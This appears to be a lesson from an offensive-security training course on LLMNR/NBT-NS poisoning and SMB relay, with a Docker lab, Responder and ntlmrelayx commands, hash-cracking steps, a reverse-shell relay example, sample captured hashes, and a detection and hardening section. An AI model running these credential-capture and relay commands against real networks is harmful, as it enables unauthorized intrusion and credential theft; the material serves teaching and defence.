---
title: "SMB Relay and LLMNR Poisoning"
tags: [network, SMB, LLMNR, NBT-NS, Responder, ntlmrelayx, NTLMv2, relay,
       credential-capture, Windows, T1557, T1187, ATT&CK]
module: 04-BroadSurface-04
day: 232
related_topics:
  - MITM and ARP Spoofing (Day 231)
  - Network Credential Extraction (Day 233)
  - Windows PrivEsc Enumeration (Day 238)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 232 — SMB Relay and LLMNR Poisoning

> "LLMNR and NBT-NS are fallback protocols that exist because DNS sometimes
> fails. They broadcast a name resolution query to the local subnet, and any
> host can answer. Any host. Including yours. The moment a Windows machine
> cannot resolve a name via DNS, it asks everyone within earshot — and you
> answer. That is not a configuration error on the victim's part. That is the
> protocol doing exactly what it was designed to do."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Explain why LLMNR and NBT-NS exist and how they create a credential capture
   surface.
2. Use Responder to capture NTLMv2 hashes from machines on a lab subnet.
3. Relay captured NTLM authentication to a second host using ntlmrelayx to
   gain shell access without cracking the hash.
4. Enumerate and exploit SMB signing misconfigurations.
5. Write detections for Responder activity and NTLM relay attacks.

**Time budget:** 4–5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| MITM and ARP spoofing concepts | Day 231 |
| Windows networking fundamentals | Days 9–16 |
| Hash cracking basics (hashcat/john) | Day 28 (Crypto module) |

---

## Part 1 — LLMNR and NBT-NS: The Vulnerability

### Name Resolution Fallback Chain

When a Windows machine needs to resolve a hostname, it tries these steps in order:

```
1. Local hosts file     (C:\Windows\System32\drivers\etc\hosts)
2. DNS server           (configured via DHCP or static)
3. LLMNR               (Link-Local Multicast Name Resolution — UDP 5355)
4. NBT-NS              (NetBIOS Name Service — UDP 137)
```

Steps 3 and 4 broadcast the query to the local subnet: "Does anyone know
the address for `fileserver01`?"

**The attack:** You listen on the subnet. When a query arrives, you respond
before the real host can: "I am `fileserver01`. Connect to me." The victim
tries to authenticate — typically over SMB — and sends you their NTLMv2 hash.

**Why this happens in practice:** A user misTypes a UNC path (`\\fileserve` 
instead of `\\fileserver`). Windows can't find it in DNS → falls back to LLMNR.
An application tries to connect to a share that doesn't exist. A scheduled task
references a network path that was decommissioned. Each scenario produces a 
broadcast that Responder answers.

**MITRE ATT&CK:** T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay

---

## Part 2 — Lab Setup

```bash
# This attack requires Windows victims. Options:
# 1. A Windows VM on a host-only adapter (most realistic)
# 2. Docker containers running Samba with Windows authentication

# Option B — Samba containers (Linux-based lab)
docker network create --subnet=10.10.10.0/24 smb-lab

# Victim A — Samba server (target for relay)
docker run -d --name smb-victim-a \
  --network smb-lab --ip 10.10.10.10 \
  --hostname smb-victim-a \
  -e "SAMBA_ADMIN_PASSWORD=Password123!" \
  dperson/samba -u "user1;Password123!" \
               -s "shared;/shares;yes;no;yes;all;none"

# Victim B — simulates a workstation making name resolution queries
docker run -d --name smb-victim-b \
  --network smb-lab --ip 10.10.10.20 \
  --hostname smb-victim-b \
  ubuntu:22.04 sleep infinity

# Attacker
docker run -it --rm \
  --name attacker \
  --network smb-lab --ip 10.10.10.100 \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  kalilinux/kali-rolling bash

# Inside attacker:
apt-get install -y responder impacket-scripts hashcat john
```

---

## Part 3 — LLMNR Poisoning with Responder

### Responder Architecture

Responder listens on the network interface and responds to LLMNR, NBT-NS, and
MDNS queries with forged replies pointing to itself. When the victim connects
to the fake server, Responder captures the NTLMv2 authentication exchange.

```bash
# Start Responder (capture-only mode — no relay yet)
responder -I eth0 -v

# Responder starts listeners on:
# - UDP 5355 (LLMNR)
# - UDP 137 (NBT-NS)
# - TCP 445 (SMB) — to capture the auth
# - TCP 80, 443 (HTTP/HTTPS) — for Webdav/HTTP NTLM
# - TCP 21 (FTP)
# - TCP 110, 143 (POP3/IMAP)
```

### Trigger a Query (Simulating the Victim)

In a real engagement, you wait for organic traffic. In the lab:

```bash
# From victim-b container — simulate a failed name resolution
docker exec smb-victim-b bash -c \
  "smbclient //nonexistent-server/share -U user1%Password123! 2>&1 || true"

# Or trigger a WebDAV NTLM auth (no SMB needed):
docker exec smb-victim-b curl -v --ntlm \
  --user user1:Password123! http://10.10.10.100/
```

### Captured Hash

Responder will print something like:

```
[SMB] NTLMv2-SSP Client   : 10.10.10.20
[SMB] NTLMv2-SSP Username : WORKGROUP\user1
[SMB] NTLMv2-SSP Hash     : user1::WORKGROUP:aabbccdd...:1122334455...:01010000...
```

Save hashes to `/usr/share/responder/logs/`:

```bash
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-10.10.10.20.txt
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.20.txt
```

---

## Part 4 — Cracking NTLMv2 Hashes

NTLMv2 is a challenge-response protocol. The hash is not replayable directly
(unlike Net-NTLMv1) but it is crackable offline.

```bash
# With hashcat (GPU-accelerated — fastest)
# Mode 5600 = Net-NTLMv2
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.20.txt \
  /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule

# With john (CPU)
john --wordlist=/usr/share/wordlists/rockyou.txt \
  /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.20.txt \
  --format=netntlmv2

# If cracked, you now have cleartext credentials → use them directly
# If not cracked → use the relay attack instead (Part 5)
```

**Cracking viability:**
- Common/dictionary passwords: crack in seconds to minutes
- Complex passwords: may not crack at all
- **This is why relay is more valuable than cracking** — relay works regardless
  of password complexity

---

## Part 5 — SMB Relay with ntlmrelayx

Instead of cracking the hash, you relay the NTLM authentication to a different
host — using the victim's own credentials to authenticate somewhere else.

### Prerequisite: SMB Signing

SMB relay only works against targets where **SMB signing is not required**.
If signing is enforced, the relay server cannot forge a signed packet and the
authentication fails.

```bash
# Check SMB signing across the subnet
nmap -p 445 --script smb2-security-mode 10.10.10.0/24

# Output to watch for:
# "Message signing enabled but not required" → VULNERABLE TO RELAY
# "Message signing enabled and required"     → NOT vulnerable to relay
```

### Relay Attack Setup

Two things run simultaneously:
1. Responder (poisoning only — SMB server OFF to avoid competing with ntlmrelayx)
2. ntlmrelayx (the relay server)

```bash
# Step 1: Disable Responder's SMB and HTTP servers (they compete with ntlmrelayx)
# Edit /etc/responder/Responder.conf:
sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Step 2: Start Responder in poisoning-only mode
responder -I eth0 -v &

# Step 3: Start ntlmrelayx targeting smb-victim-a
# -tf: target file (list of hosts to relay to)
# -smb2support: enable SMBv2
# -i: interactive shell if auth succeeds
echo "10.10.10.10" > /tmp/targets.txt
ntlmrelayx.py -tf /tmp/targets.txt -smb2support -i

# When a victim authenticates (LLMNR poisoning triggers it),
# ntlmrelayx relays the auth to 10.10.10.10 and:
# - Dumps SAM database (password hashes for all local users)
# - Opens an interactive SMB shell
# - Or executes a command (-c "whoami")
```

### Relay with Command Execution

```bash
# Execute a reverse shell via relay
ntlmrelayx.py -tf /tmp/targets.txt -smb2support \
  -c "powershell -enc <base64-encoded-payload>"

# Or dump hashes from SAM
ntlmrelayx.py -tf /tmp/targets.txt -smb2support
# Will print:
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# user1:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::
```

NT hashes from SAM can be used directly in pass-the-hash attacks — no
cracking needed.

---

## Part 6 — Detection

### Detecting Responder / LLMNR Poisoning

**Network-level indicator:** An unexpected host answering LLMNR/NBT-NS queries.

```bash
# Wireshark filter for LLMNR traffic:
# udp.port == 5355

# Look for: multiple responses to the same LLMNR query from different IPs
# Legitimate: one response from the authoritative host
# Suspicious: a response from an unexpected IP (especially rapid responses)
```

**Host-level indicator (Windows Event Log):**
- Event ID 4625 (Failed Logon) + Logon Type 3 (Network) from unknown IPs
- Event ID 4648 (Explicit Credential Logon) with unknown target server

**SIEM rule (Sigma format):**
```yaml
title: LLMNR Poisoning — Unexpected LLMNR Response
status: experimental
logsource:
  product: zeek
  service: dns
detection:
  selection:
    protocol: udp
    destination_port: 5355
    dns.qr: 1          # response (not query)
  filter_legitimate:
    source_ip|contains:
      - 10.10.10.10    # known legitimate hosts
      - 10.10.10.20
  condition: selection and not filter_legitimate
falsepositives:
  - New devices added to the network
level: high
tags:
  - attack.credential_access
  - attack.t1557.001
```

### Fix

```
1. Disable LLMNR (Group Policy):
   Computer Configuration → Administrative Templates
   → Network → DNS Client → Turn off multicast name resolution → Enabled

2. Disable NBT-NS (via PowerShell on all adapters):
   $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
   $adapters | ForEach-Object { $_.SetTcpipNetbios(2) }

3. Require SMB signing on all hosts (Group Policy):
   Computer Configuration → Windows Settings → Security Settings →
   Local Policies → Security Options
   → Microsoft network client: Digitally sign communications (always) → Enabled
   → Microsoft network server: Digitally sign communications (always) → Enabled

4. Enable LDAP signing + channel binding (for LDAP relay variant)
```

---

## Key Takeaways

1. **LLMNR poisoning is a broadcast-level attack.** You do not need to be
   directly connected to the victim. You only need to be on the same Layer 2
   segment and reply faster than the legitimate host (or there is no legitimate
   host for that name).
2. **Relay beats cracking.** An NTLMv2 hash from a 20-character password is
   uncrackable. A relayed authentication is just as valid regardless of password
   complexity. Always attempt relay before spending time cracking.
3. **SMB signing is the surgical fix.** Disabling LLMNR removes the initial
   vector. Enforcing SMB signing removes the relay attack even if you still
   get the hash. Both together close the entire chain.
4. **Domain environments are high-value targets.** If the relayed account
   is a local administrator on multiple hosts (common in large environments
   without LAPS), a single poisoned authentication unlocks all of them.
5. **Event ID 4625 is not enough.** Failed logins from unexpected IPs should
   alert, but relay attacks produce successful logins (Event 4624) — harder
   to distinguish from legitimate traffic without baselining.

---

## Exercises

1. Capture a successful LLMNR poisoning session end-to-end in Wireshark.
   Filter to show only: the LLMNR query, the poisoned response, and the
   subsequent SMB authentication attempt. Write the three display filter
   strings needed.

2. Use hashcat to crack the NTLMv2 hash captured in the lab. Time the
   crack. Then attempt the same hash with John the Ripper using the same
   wordlist. Which is faster? By how much?

3. Research: what is LAPS (Local Administrator Password Solution) and how
   does it prevent a single relayed credential from unlocking multiple hosts?
   What is the attack path against an environment with LAPS deployed?

4. Write a Sigma detection rule for ntlmrelayx activity — specifically the
   pattern of rapid sequential 4624 events (successful network logons) from
   the same source IP across multiple destination hosts within a 5-minute
   window.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q232.1, Q232.2 …).
> Follow-up questions use hierarchical numbering (Q232.1.1, Q232.1.2 …).

---

## Navigation

← Previous: [Day 231 — MITM and ARP Spoofing Lab](DAY-0231-MITM-ARP-Spoofing-Lab.md)
→ Next: [Day 233 — Network Credential Extraction](DAY-0233-Network-Credential-Extraction.md)
